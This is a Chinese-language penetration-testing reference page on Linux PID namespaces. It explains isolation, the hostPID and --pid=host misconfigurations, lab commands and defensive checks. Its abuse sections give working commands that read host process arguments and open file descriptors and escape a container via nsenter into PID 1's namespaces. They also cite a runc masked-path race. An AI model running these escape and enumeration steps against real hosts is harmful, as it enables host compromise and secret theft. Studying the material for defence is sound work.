# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

PID namespace 控制进程的编号方式以及哪些进程可见。这就是为什么 container 可以拥有自己的 PID 1，尽管它并不是一台真正的机器。在该 namespace 内，workload 看到的是一个看似本地的进程树。在 namespace 外，host 仍然可以看到真实的 host PID 以及完整的进程环境。

从安全角度来看，PID namespace 很重要，因为进程可见性具有很高的价值。一旦 workload 能够看到 host 进程，它可能就能观察到 service 名称、命令行参数、通过进程参数传递的 secrets、通过 `/proc` 获取的源自环境的状态，以及潜在的 namespace-entry targets。如果它不仅能查看这些进程，还能在满足适当条件时向其发送 signals 或使用 ptrace，问题就会严重得多。

## 操作

新的 PID namespace 会从独立的内部进程编号开始。namespace 内创建的第一个进程，从该 namespace 的角度来看会成为 PID 1，这也意味着它会针对 orphaned children 和 signal behavior 获得特殊的、类似 init 的语义。这解释了许多 container 中与 init 进程、zombie 回收以及为何有时会使用 tiny init wrappers 相关的异常现象。

重要的安全经验是：一个进程可能因为只能看到自己的 PID tree 而看似实现了隔离，但这种隔离可以被有意移除。Docker 通过 `--pid=host` 提供此功能，而 Kubernetes 则通过 `hostPID: true` 实现。一旦 container 加入 host PID namespace，workload 就能直接看到 host 进程，许多后续的 attack paths 也会变得更加现实。

## Lab

手动创建 PID namespace：
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
现在，shell 可以看到一个私有的进程视图。`--mount-proc` flag 很重要，因为它会挂载一个与新的 PID namespace 匹配的 procfs 实例，使进程列表在内部保持一致。

为了对比容器行为：
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
差异是立刻可见且易于理解的，这也是它适合作为读者第一个 lab 的原因。

## Runtime Usage

Docker、Podman、containerd 和 CRI-O 中的普通容器都会获得各自的 PID namespace。Kubernetes Pods 通常也会获得隔离的 PID 视图，除非 workload 明确请求共享 host PID。LXC/Incus 环境依赖相同的 kernel primitive，不过 system-container 使用场景可能会暴露更复杂的 process tree，并促使人们采用更多 debugging shortcuts。

同一规则适用于所有环境：如果 runtime 选择不隔离 PID namespace，这就意味着 container boundary 被有意削弱。

## Misconfigurations

最典型的 misconfiguration 是共享 host PID。团队通常会以 debugging、monitoring 或 service-management 便利性为理由，但这始终应被视为一个具有实际安全影响的例外。即使 container 无法立即对 host processes 执行 write primitive，仅可见性也可能暴露大量系统信息。一旦加入 `CAP_SYS_PTRACE` 等 capabilities，或提供有用的 procfs access，风险就会显著扩大。

另一个错误是认为，由于 workload 默认无法 kill 或 ptrace host processes，因此共享 host PID 就是无害的。这一结论忽略了 enumeration 的价值、namespace-entry targets 的可用性，以及 PID 可见性与其他被削弱的 controls 结合后产生的影响。

## Abuse

如果共享了 host PID namespace，attacker 可能检查 host processes、收集 process arguments、识别有趣的 services、定位可供 `nsenter` 使用的候选 PIDs，或将 process visibility 与 ptrace 相关 privilege 结合起来，干扰 host 或相邻的 workloads。在某些情况下，仅仅看到正确的 long-running process，就足以改变后续的 attack plan。

第一步始终是确认 host processes 确实可见：
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
一旦 host PIDs 可见，进程参数和 namespace-entry 目标通常会成为最有用的信息来源：
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
如果存在 `nsenter` 且权限足够，请测试是否可以将一个可见的 host 进程用作 namespace bridge：
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
即使 entry 被阻止，共享 host PID 仍然很有价值，因为它会暴露 service 布局、runtime 组件以及可作为下一步攻击目标的潜在 privileged 进程。

Host PID 可见性还会让 file-descriptor abuse 更加现实。如果某个 privileged host 进程或相邻 workload 打开了敏感文件或 socket，攻击者可能能够检查 `/proc/<pid>/fd/`，并根据所有权、procfs mount 选项以及目标 service 模型重新使用该句柄。
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
这些命令很有用，因为它们可以说明 `hidepid=1` 或 `hidepid=2` 是否正在减少跨进程可见性，以及诸如已打开的 secret 文件、日志或 Unix socket 等明显有趣的 descriptors 是否完全可见。

### 完整示例：host PID + `nsenter`

当进程同时拥有足够的 privilege 加入 host namespaces 时，共享 host PID 会直接导致 host escape：
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
如果命令执行成功，container process 现在会在 host 的 mount、UTS、network、IPC 和 PID namespaces 中执行。其影响是立即 compromise host。

即使缺少 `nsenter`，只要挂载了 host filesystem，也可能通过 host binary 实现相同结果：
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### 最近的 Runtime 说明

一些与 PID namespace 相关的攻击并不是传统的 `hostPID: true` misconfiguration，而是围绕容器 setup 期间如何应用 procfs protections 的 runtime implementation bugs。

#### `maskedPaths` 竞态导致 host procfs 暴露

在存在漏洞的 `runc` 版本中，能够控制 container image 或 `runc exec` workload 的攻击者可以通过将容器侧的 `/dev/null` 替换为指向敏感 procfs path（例如 `/proc/sys/kernel/core_pattern`）的 symlink，来与 masking phase 进行 race。如果 race 成功，masked-path bind mount 可能会落到错误的 target 上，从而向新容器暴露 host-global procfs knobs。<sup>[[1]](#references)</sup>

Useful review command:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
这很重要，因为最终影响可能与直接暴露 procfs 相同：可写的 `core_pattern` 或 `sysrq-trigger`，随后导致 host 代码执行或拒绝服务。

#### 使用 `insject` 进行 namespace 注入

诸如 `insject` 的 namespace 注入工具表明，PID-namespace 交互并不总是要求在创建进程之前预先进入目标 namespace。helper 可以稍后附加，使用 `setns()`，并在保留对目标 PID 空间可见性的同时执行：<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
这种技术主要适用于 advanced debugging、offensive tooling 和 post-exploitation workflows，其中必须在 runtime 已经初始化 workload 后加入 namespace context。

### Related FD Abuse Patterns

当 host PIDs 可见时，有两种模式值得特别指出。第一，特权进程可能会在 `execve()` 期间保持敏感 file descriptor 处于打开状态，因为它没有被标记为 `O_CLOEXEC`。第二，services 可能会通过 Unix sockets，使用 `SCM_RIGHTS` 传递 file descriptors。在这两种情况下，关键对象不再是 pathname，而是 lower-privilege process 可能继承或接收的已打开 handle。

这在 container work 中很重要，因为即使该路径无法直接从 container filesystem 访问，这个 handle 仍可能指向 `docker.sock`、特权 log、host secret file 或其他高价值对象。

## Checks

这些命令用于确定该 process 是否拥有 private PID view，或者是否已经能够枚举范围更广的 process landscape。
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
这里有哪些值得注意的地方：

- 如果进程列表中包含明显的 host 服务，那么 host PID sharing 可能已经生效。
- 只看到一个很小的、仅属于 container 的进程树是正常基线；看到 `systemd`、`dockerd` 或无关的 daemon 则不是。
- 一旦可以看到 host PIDs，即使是只读的进程信息也能提供有用的侦察情报。

如果你发现某个 container 使用了 host PID sharing，不要把它当作外观上的差异。这会显著改变 workload 能够观察到并可能影响的对象。

## References

- [1] [runc 安全公告：由于 mount race conditions，通过“masked path”滥用实现 container escape（CVE-2025-31133）](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject：Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)

{{#include ../../../../../banners/hacktricks-training.md}}
